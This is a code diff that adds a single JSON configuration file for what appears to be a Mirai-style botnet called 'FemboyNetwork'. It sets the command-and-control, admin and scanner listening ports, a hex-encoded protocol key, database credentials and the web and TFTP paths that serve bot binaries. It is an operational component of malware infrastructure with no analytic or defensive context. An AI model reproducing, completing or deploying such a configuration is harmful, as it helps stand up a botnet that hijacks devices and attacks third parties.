@@ -1,0 +1,1 @@
+{"cnc_listen":"0.0.0.0:34129","admin_listen":"0.0.0.0:34131","scan_listen":"0.0.0.0:34130","proto_key":"66656d626f796e6574776f726b66656d626f796e6574776f726b","mysql_addr":"127.0.0.1:3306","mysql_user":"fnb","mysql_pass":"fnb","mysql_table":"FemboyNetwork","http_server":"127.0.0.1","tftp_server":"127.0.0.1","bin_prefix":"fnbnet","bin_path":"/var/www/html/bins"}
